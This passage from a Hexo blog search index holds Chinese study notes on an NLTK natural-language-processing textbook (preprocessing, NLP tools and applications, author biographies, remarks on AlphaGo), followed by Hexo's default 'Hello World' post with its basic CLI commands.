title="实例"></a>实例</h2>探索性数据分析（EDA）。<br>通常对于一段文本域而言，EDA可能包含了多重含义。<br>文档的主体术语类型是其中的一个简单用例。<br>主题是什么？<br>它们的出现频率如何？<br>整个分析过程还会或多或少地涉及一些预处理层面的步骤。<br>试着先用纯Python的方式来实现它，然后用NLTK再将其实现一次。<br>清理掉html标签。<br>一种可行的做法是只选取其中的标记，包括数字和字符。<br>正则表达式可以轻松地将这些html字符串转换成一个标记列表。</li></ul><h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>NLTK、文本处理、NLP、机器学习、数据科学领域<br>信息检索、分布式处理、本体开发、自然语言处理和机器学习<br>NLTK库与Python库。其他的Python库，你应该了解一下这些与文本挖掘或自然语言处理任务相关的库。<br>NLP任务和机器学习应用<br>通用的预处理技术、专属于NLP领域的预处理技术以及命名实体识别技术<br>文本分类、数据科学和数据处理、社交媒体挖掘和大规模文本挖掘<br>标识化处理、语块分解、词性标注、语法解析、机器翻译及语音识别<br>语言处理及大型非结构化数据<br>一些相关特定能力的Python库，如NLTK、scikit-learn、panda和NumPy<br>基础数据科学、机器学习起步<br>文本分析、网页抓取及检索、人力资源分析、虚拟系统的性能优化，以及气候变化的预测<br>路径名、文件夹名、文件名、文件扩展名、伪URL<br>数据库表名<br>用户输入以及Twitter句柄、代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">文本的歧义及其清理</span><br><span class="line">    通用的预处理技术。在任何文本挖掘和NLP任务中所需的所有预处理步骤。</span><br><span class="line">        断词处理、词干处理、停用词去除。</span><br><span class="line">        例如标识化处理（tokenization）、词干提取（stemming）、停用词（stop word）去除；</span><br><span class="line">        本清理技术，如何用NLTK来简化它们的实现。</span><br><span class="line">    专属于NPL领域的预处理技术等，</span><br><span class="line">        如词性标注（part-of-speech tagging）；以及大多数文本相关的NLP任务都会涉及的命名实体识别（Named-entity recognition，简称NER）等技术。</span><br><span class="line">    更为复杂的NLP任务上，例如语法解析（parsing）以及其他NLP应用。</span><br><span class="line">    NLP应用:</span><br><span class="line">        如何进行文本分类，可以用NLTK搭配scikit-learn库来进行。</span><br><span class="line">        如何从网页和社交媒体中采集数据</span><br><span class="line">        如何用NLTK进行大规模的文本处理</span><br><span class="line">自然语言处理简介</span><br></pre></td></tr></table></figure></p><h1 id="词条"><a href="#词条" class="headerlink" title="词条"></a>词条</h1><p>解释型编程语言，会在对其表达式进行计算的同时检查其中的变量类型。在声明变量时无需对其进行初始化和类型声明。例如：Python。<br>对语言有深入研究的人通常被叫作语言学家。<br>而“计算机语言学家”这个专用名词则指的是将计算机科学应用于语言处理领域的人。<br>因此从本质上来说，一个计算机语言学家应该既有足够的语言理解能力，同时还可以用其计算机技能来模拟出语言的不同方面。<br>虽然计算机语言学家主要研究的是语言处理理论，但NLP无疑是对计算机语言学的具体应用。</p><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><p>字典是一种键值索引型的数据结构，其索引键可以是任意一种不可变的类型，例如字符串和数字都经常被用来充当索引键。<br>字典是被多种编程语言广泛用于实现诸多算法的一种非常便利的数据结构。<br>而且，Python的字典结构还是所有的这些编程语言中最为优雅的哈希表实现之一。</p><h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><p>哈希表是一种操作起来非常容易的字典结构，其优势在于，你只需通过寥寥几段代码就可以用它建立起一个非常复杂的数据结构。</p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>而所有类似于其他编程语言中的参数和参数类型的声明都会被放在该括号内。Python也有自己的函数编写方式。<br>从大型程序的编写实践来说，使用函数/类和某种成熟的编程范式是一个更佳的做法。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> &lt;函数名&gt;<span class="params">()</span>:</span></span><br></pre></td></tr></table></figure></p><p>在Python中，<br>    函数的定义通常会从关键字def开始，<br>    后面紧跟着相应的函数名和括号()。<br>    实际代码部分将会从冒号（:）后面开始，<br>        代码的初始行通常会是一个文档字符串（注释），<br>        接着是代码的主体部分，<br>        最后我们会以一个return语句来结束整个函数。</p><h2 id="NLP"><a href="#NLP" class="headerlink" title="NLP"></a>NLP</h2><p>在英语环境中，语言处理研究这一领域通常被简称为NLP。<br>NLP多数情况下指的是计算机上各种大同小异的语言处理应用，以及用NLP技术所构建的实际应用程序。<br>在实践中，NLP与教孩子学语言的过程非常类似。<br>其大多数任务（如对单词、语句的理解，形成语法和结构都正确的语句等）对于人类而言都是非常自然的能力。<br>但对于NLP来说，其中有一些任务就必须要转向<a href="#分类">文本分析</a><br>等这些领域的一部分，且这些任务有一大部分还仍是当前计算机领域中非常棘手的挑战。<br>自大数据的概念问世之后，我们所面对的主要挑战是——业界需要越来越多不仅能处理结构化数据，同时也能处理半结构化或非结构化数据的人才。<br>对于我们所生产出来的那些博客、微博、Facebook订阅、聊天信息、E-mail以及网络评论等，各公司都在致力于收集所有不同种类的数据，以便建立更好的客户针对性，形成有意义的见解。<br>而要想处理所有的这些非结构化数据源，我们就需要掌握一些NLP技能的人员。</p><h3 id="NLP工具清单"><a href="#NLP工具清单" class="headerlink" title="NLP工具清单"></a>NLP工具清单</h3><p>这些工具有些是由相关组织在建立自己的NLP应用时开发的，而有些则纯粹属于开源项目：<br>    GATE。<br>    Mallet。<br>    Open NLP。<br>    UIMA。<br>    Stanford toolkit。<br>    Genism。<br>    Natural Language Tool Kit (NLTK)<br>上述大多数工具都是用Java编写的，在功能上也都很相似。强大实用。</p><h3 id="现实应用"><a href="#现实应用" class="headerlink" title="现实应用"></a>现实应用</h3><p>拼写校正（MS Word/其他编辑器）<br>搜索引擎（Google、Bing、Yahoo!、WolframAlpha）。<br>语音引擎（Siri、Google Voice）。<br>垃圾邮件分类（所有电子邮件服务）。垃圾过滤器来过滤垃圾邮件<br>新闻订阅（Google、Yahoo!等）。<br>机器翻译（Google翻译与其他类似服务）。<br>IBM Watson<br>最基本的事情用到Siri</p><p><img src="https://upload-images.jianshu.io/upload_images/6908911-6c01a13213e00401.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="停用词"><a href="#停用词" class="headerlink" title="停用词"></a>停用词</h2><p>无用词。由于冠词、代词在大多数文档中都是普遍存在的，因而对信息的识别没有帮助。<br>a an the<br>of for =<br>在大多数NLP及信息检索任务中，人们通常都会先删除掉这些停用词。</p><h2 id="NLTK"><a href="#NLTK" class="headerlink" title="NLTK"></a>NLTK</h2><p>NLTK的设计充分体现了简单的魅力。也就是说，对于大多数复杂的NLP任务，它都可以用寥寥几行代码来实现。<br>NLTK：易用性（NLTK库是一个非常易学的工具包）和其对相关概念的解释度。<br>这得益于Python本身非常平缓的学习曲线（毕竟NLTK是用它编写的），人们学习起来会非常快。<br>NLTK库中收纳了NLP领域中的绝大部分任务，它们都被实现得非常优雅，且易于使用。<br>正是出于上述的这些原因，NLTK如今已成为了NLP社区最流行的库之一。</p><h2 id="图灵测试"><a href="#图灵测试" class="headerlink" title="图灵测试"></a>图灵测试</h2><p>图灵测试关注的是人机对话能力，换句话说，什么时候机器能通过对话骗到你的一百块钱，也比它下棋下赢世界冠军更智能点。而想要增强人机对话能力，自然语言处理就是首当其冲的一个领域了。正如我们所说，机器的专长是数学领域，所以自然语言处理问题的目的就是要把我们人类的文本、音频转换成可被分析的数学模型，这对于机器来说是比围棋困难得多的事情。这也是人类和机器的根本区别，对于这两种智能来说，困难的定义是截然不同的。</p><h2 id="人物"><a href="#人物" class="headerlink" title="人物"></a>人物</h2><h3 id="Nitin-Hardeniya"><a href="#Nitin-Hardeniya" class="headerlink" title="Nitin Hardeniya"></a>Nitin Hardeniya</h3><p>Nitin Hardeniya数据科学家，拥有4年以上从业经验，期间分别任职于Fidelity、Groupon和[24]7等公司，其业务横跨各个不同的领域。此外，他还拥有IIIT-H的计算语言学硕士学位，并且是5项客户体验专利的作者。<br>他热衷于研究语言处理及大型非结构化数据，至少拥有5年日常使用Python的工作经验。他相信，用Python可以构建出大部分与数据科学相关问题的单点解决方案。<br>他将自己写这本书的经历看成是自己职业生涯的众多荣誉之一，希望用一种非常简单的形式为人们介绍与NLP和机器学习相关的、所有的这些复杂工具。在这本书中，他为读者提供了一种变通方法，即使用一些相关特定能力的Python库，如NLTK、scikit-learn、panda和NumPy等。<br>《NLTK基础教程——用NLTK和Python库构建机器学习应用》作者</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>审阅者简介Afroz Hussain数据科学家，目前在PredictifyMe公司从事与美国基础数据科学、机器学习起步相关的研究。他在数据科学领域拥有丰富的项目经验、多年使用Python、scikit-learn，以及基于NLTK进行文本挖掘的工作经历。他拥有10年以上的编程经验以及与数据分析和商业智能项目相关的软件开发经验。此外，他还通过在线课程以及参加Kaggle比赛等活动，获得了不少数据科学领域的新技能。<br>Sujit Pal目前就职于[[Elsevier实验室]]，这是一个包含了[[Reed-Elsevier PLC工作组]]在内的研发团队。他的兴趣主要集中在信息检索、分布式处理、本体开发、自然语言处理和机器学习这几个领域。而且，他也很喜欢用Python、Scala和Java来编写自己的代码。他充分整合了自己在这些方面的技能，帮助公司改进了不同产品的一些特性并构建了一些新特性。他深信自己需要终身学习，并且也在博客：sujitpal.blogspot.com中分享其经验。<br>Kumar Raj第二代数据科学家，目前就职于惠普软件的研发部门，为其提供相关的解决方案。在那里，他主要负责开发以惠普软件产品为核心的分析层。他毕业于印度理工学院Kharagpur技术分校，并具有两年以上各种大数据分析领域的工作经验，涉及文本分析、网页抓取及检索、人力资源分析、虚拟系统的性能优化，以及气候变化的预测等</p><h1 id="需要累积"><a href="#需要累积" class="headerlink" title="需要累积"></a>需要累积</h1><p>N年使用Python的工作经验经历<br>在数据科学领域拥有丰富的项目经验<br>编程经验<br>数据分析和商业智能项目相关的软件开发经验<br>充分整合了自己的技能<br>帮助公司改进了不同产品的一些特性并构建了一些新特性</p><h1 id="社会现象"><a href="#社会现象" class="headerlink" title="社会现象"></a>社会现象</h1><p>说来也凑巧，在我签下这本书的翻译合同时，这个世界好像还不知道AlphaGo的存在。而在我完成这本书的翻译之时，Master已经对人类顶级高手连胜60局了。至少从媒体的热度来看，的确在近几年，人工智能似乎是越来越火了。其原因是Google在汽车驾驶和围棋这两个领域的项目得到了很好的进展和宣传，而这两个领域在过去被很多人想当然地认为是人类的专属领域。因此在专属领域接连被突破情况下，一些人得了“机器恐惧症”。例如高晓松先生的这段微博：</p><p><blockquote><br>@高晓松　<br>作为自幼学棋，崇拜国手的业余棋手，看了Master50 : 0横扫中日韩顶尖高手的对局，难过极了。为所有的大国手伤心，路已经走完了。多少代大师上下求索，求道求术，全被破解。未来一个八岁少年只要一部手机就可以战胜九段，荣誉信仰灰飞烟灭。等有一天，机器做出了所有的音乐和诗歌，我们的路也会走完。<br>1月4日　16:21　来自　iPhone 7 Plus<br></blockquote><br>其实之所以会有这样恐惧，大部分是因为人们在讨论人工智能的时候容易将机器“人格化”，很多科幻作品就是这么干的，这看起来很合理，但问题是机器无论如何都不是人。对于机器来说，围棋说穿了不过是一种基于统计学概率的决策模型，属于数学领域的问题，它本来就是机器的强项。用围棋对于人类的难度来推导机器智能的进步，其实是很没有逻辑的事情。而且事实上，今天所流行的这些人工智能方法都是在20世纪70年代前后提出的理论，今天的辉煌主要是由于硬件的进步为实现提供了基础，但在智能上并没有多大的实质突破。要知道，人们对于鉴定人工智能的主要标准早有定论，那就是图灵测试</p><h1 id="套话"><a href="#套话" class="headerlink" title="套话"></a>套话</h1><p>众所周知，语言是人们日常生活的核心部分，任何与语言问题相关的工作都会显得非常有意思。希望这本书能带你领略到NLP的风采，并引起学习NLP的兴趣。首先，我们需要来了解一下该领域中的一些令人惊叹的概念，并在工作中实际尝试一些具有挑战性的NLP应用。<br>身处信息时代，我们甚至不能想象生活中没有Google会是什么样子。<br>在这里，我们可以再列举一些令人惊叹的NLP应用实例。<br>构建上述这些应用都需要非常具体的技能，需要优秀的语言理解能力和能有效处理这些语言的工具。因此，这些不仅是各NLP最具优势领域的未来趋势，同时也是我们用NLP这种最独特技能所能创建的应用种类</p>]]></content>
      
      
      
        <tags>
            
            <tag> fix </tag>
            
            <tag> ML </tag>
            
            <tag> 文本分析 </tag>
            
            <tag> NLP </tag>
            
            <tag> packtpub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/cs/leetcode/hello-world/"/>
      <url>/cs/leetcode/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
